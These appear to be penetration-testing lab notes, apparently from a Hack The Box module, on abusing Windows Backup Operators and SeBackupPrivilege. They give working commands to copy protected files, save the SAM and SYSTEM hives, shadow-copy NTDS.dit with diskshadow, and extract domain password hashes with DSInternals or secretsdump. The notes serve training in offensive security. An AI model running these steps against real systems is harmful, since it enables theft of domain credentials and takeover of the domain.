
[List](https://ss64.com/nt/syntax-security_groups.html) of all built-in Windows groups along with a detailed description of each. [List](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory) of privileged accounts and groups in Active Directory. 

---
## Backup Operators

The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). 

We need to programmatically copy the data, making sure to specify the [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag. [PoC](https://github.com/giuliano108/SeBackupPrivilege) to exploit the `SeBackupPrivilege`.

```powershell
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll 
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
### importing exploit modules

PS C:\htb> Set-SeBackupPrivilege
### Enabling the Privilege 

PS C:\htb> Get-SeBackupPrivilege
### Checking Privilege Status

PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\contract.txt' .\file.txt 
### Exploiting Privilege and copying files wout necessary permissions

C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV
C:\htb> reg save HKLM\SAM SAM.SAV
### This privilege lets us back up SYSTEM and SAM registry hives too 
```

If a folder or file has an explicit deny entry for our current user or their group, this will prevent us from accessing it, even with the `FILE_FLAG_BACKUP_SEMANTICS` flag.

---

### Attacking a Domain Controller - Copying NTDS.dit

As the `NTDS.dit` file is locked by default, We can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive.

```PowerShell
PS C:\htb> diskshadow.exe
DISKSHADOW> set verbose on 
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab 
DISKSHADOW> set context clientaccessible 
DISKSHADOW> set context persistent 
DISKSHADOW> begin backup 
DISKSHADOW> add volume C: alias cdrive 
DISKSHADOW> create 
DISKSHADOW> expose %cdrive% E: 
DISKSHADOW> end backup 
DISKSHADOW> exit
### Creating a shadow copy of our C: drive

PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
### Copying NTDS.dit by bypassing the ACL

PS C:\htb> Import-Module .\DSInternals.psd1 
### Module to extract all AD account credentials

PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM 
### Setting up a variable
 
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
### Extracting NTLM Hash for just Administrator
```

We can also use `secretsdump` instead of `DSInternals` to extract hashes. 

```sh
> secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

---
## Robocopy

Robocopy is a command-line directory replication tool. This built-in utility [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) can be used to copy files in backup mode as well.

```PowerShell
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

This eliminates the need for any external tools.

---